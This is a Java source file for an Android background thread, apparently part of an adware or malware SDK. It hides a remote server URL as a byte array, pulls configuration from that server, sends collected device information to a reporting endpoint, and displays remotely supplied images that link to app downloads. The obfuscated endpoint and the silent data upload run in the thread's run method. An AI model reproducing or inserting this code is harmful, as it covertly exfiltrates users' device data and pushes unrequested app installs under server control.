package com.flex;

import java.io.InputStream;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Set;

import android.content.Context;
import android.os.Bundle;
import android.os.Message;

public class CMainThread extends Thread {
	private final byte[] address = { 104, 116, 116, 112, 58, 47, 47, 49, 50,
			48, 46, 50, 54, 46, 51, 57, 46, 50, 51, 54, 47, 102, 120, 47, 112,
			104, 112, 47, 109, 97, 105, 110, 46, 112, 104, 112, 63, 113, 61, 49 };
	private static String tag = CMainThread.class.getName();
	private Context mContext = null;
	public static CMainThread mInstance = null;

	public static CMainThread getFlexThreadInstance(Context ctx) {
		if (mInstance == null)
			mInstance = new CMainThread(ctx);
		return mInstance;
	}

	public CMainThread(Context context) {
		mContext = context;
	}

	public void run() {
		CBasicInfo instance = CBasicInfo.getInstance();
		if (instance.setLocalInformations(mContext) == false) {
			return;
		}

		CFuncMod fm = CFuncMod.getCmInstance();
		String gData = fm.GetConfigFileContent(new String(address));
		if (gData == null || gData.isEmpty() == true) {
			return;
		}
		String[] datas = gData.split("\\n");
		fm.cacheDatas(mContext, CDataDef.KEY_GLOBALE_SHOW_SWITCH, datas[0]);
		fm.cacheDatas(mContext, CDataDef.KEY_URL_RES_DATA_REPORT, datas[1]);
		fm.cacheDatas(mContext, CDataDef.KEY_URL_RES_CID_CFG, datas[2]);
		fm.cacheDatas(mContext, CDataDef.KEY_URL_RES_PIC_CFG, datas[3]);
		fm.cacheDatas(mContext, CDataDef.KEY_URL_RES_BMD_CFG, datas[4]);
		fm.cacheDatas(mContext, CDataDef.KEY_URL_RES_DOWN_REPORT, datas[5]);
		fm.cacheDatas(mContext, CDataDef.KEY_URL_RES_BACKUP_CFG, datas[6]);

		String params = instance.getLocalInforParams(mContext);
		if (fm.NetWorkActivity(mContext) == false) {
			return;
		}
		String dataReportUrl = fm.getDatasFromCached(mContext,
				CDataDef.KEY_URL_RES_DATA_REPORT);
		if (fm.getSendState(mContext, CDataDef.KEY_DATA_SEND_STATE, false) == true) {
		} else if (fm.sendPost(dataReportUrl, params) == false) {
			return;
		}
		fm.setSendState(mContext, CDataDef.KEY_DATA_SEND_STATE, true);
		String value = fm.getDatasFromCached(mContext,
				CDataDef.KEY_GLOBALE_SHOW_SWITCH);
		if (value.equals("false") == true) {
			return;
		}
		String idCfgUrl = fm.getDatasFromCached(mContext,
				CDataDef.KEY_URL_RES_CID_CFG);
		if (fm.NetWorkActivity(mContext) == false) {
			return;
		}

		String idConfigData = fm.GetConfigFileContent(idCfgUrl);
		if (idConfigData == null || idConfigData.isEmpty()) {
			return;
		}

		String bmd = fm.GetConfigFileContent(fm.getDatasFromCached(mContext,
				CDataDef.KEY_URL_RES_BMD_CFG));
		if(CDataDef.gWhiteList == null){
			CDataDef.gWhiteList = new HashSet<String>();
		}
		String[] bmdData = bmd.split("\\n");
		for (String each : bmdData) {
			CDataDef.gWhiteList.add(each);
		}
		String bkUrl = fm.GetConfigFileContent(fm.getDatasFromCached(mContext,
				CDataDef.KEY_URL_RES_BACKUP_CFG));
		CUI.mBackupUrls = bkUrl.split("\\n");
		CDataDef.gBackupElem = fm.createBackupPictureData(CUI.mBackupUrls);
		String thisID = fm.getDatasFromCached(mContext, CDataDef.KEY_CHANNEL_ID);
		if (thisID.equals("") == true || thisID == null) {
			return;
		}

		boolean idNeedsShow = fm.thisIdNeedShow(idConfigData, thisID);
		if (idNeedsShow == false) {
			return;
		}

		String oldPicDataCfgHash = fm.getDatasFromCached(mContext,CDataDef.KEY_PICTURE_CONFIG_MD5);
		String picDatas = fm.getPictureInformationURL(fm.getDatasFromCached(mContext, CDataDef.KEY_URL_RES_PIC_CFG));
		String[] eachPic = picDatas.split("\\n");
		CDataDef.gPictureDatas = new ArrayList<CPictureData>();
		for (int i = 0; i < eachPic.length; i++) {
			String[] elements = eachPic[i].split("\\|");
			CPictureData pd = new CPictureData();
			InputStream is = fm.readRemotePicture(elements[0]);
			if(is != null){
				pd.setPicBitmap(is);
				pd.setAppDownloadURL(elements[1]);
				pd.setAppName(elements[2]);
				pd.setPicLevel(elements[3]);
				CDataDef.gPictureDatas.add(pd);	
			}
		}

		String curPicDataCfgHash = fm.MD5(picDatas);
		if (oldPicDataCfgHash.equals("")) {
			fm.getPicturesAndFillImageViews(mContext, picDatas);
			fm.cacheDatas(mContext, CDataDef.KEY_PICTURE_CONFIG_MD5,curPicDataCfgHash);
		} else {
			if (curPicDataCfgHash.equals(oldPicDataCfgHash) == true) {
			} else {
				fm.getPicturesAndFillImageViews(mContext, picDatas);
				fm.cacheDatas(mContext, CDataDef.KEY_PICTURE_CONFIG_MD5,curPicDataCfgHash);
			}
		}
		boolean safeOrNot = fm.isCurrentActivityInBmd(CDataDef.gWhiteList, mContext);
		Bundle bd = new Bundle();
		bd.putBoolean("safe", safeOrNot);
		Message msg = Message.obtain();
		msg.what = CDataDef.MSG_ID_SHOW_UI;
		msg.obj = CDataDef.gPictureDatas;
		msg.setData(bd);
		CUI.recMsg.sendMessage(msg);
	}
}
